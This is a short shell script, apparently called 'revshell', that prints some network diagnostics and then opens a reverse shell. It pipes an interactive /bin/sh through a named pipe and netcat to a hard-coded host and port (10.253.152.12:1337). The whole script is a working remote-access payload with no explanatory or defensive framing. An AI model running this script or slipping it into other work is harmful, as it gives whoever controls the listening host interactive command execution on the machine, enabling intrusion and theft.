#!/bin/sh
# Name: revshell
# Author: em

echo 'loading...'
sleep 5

HOST_IP=10.253.152.12
HOST_PORT=1337

echo "-- ip diag --"
ip addr
echo '' >&2

echo " -- load revshell --" >&2
echo "    target $HOST_IP:$HOST_PORT" >&2
echo "    timeout 30s" >&2
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $HOST_IP $HOST_PORT > /tmp/f
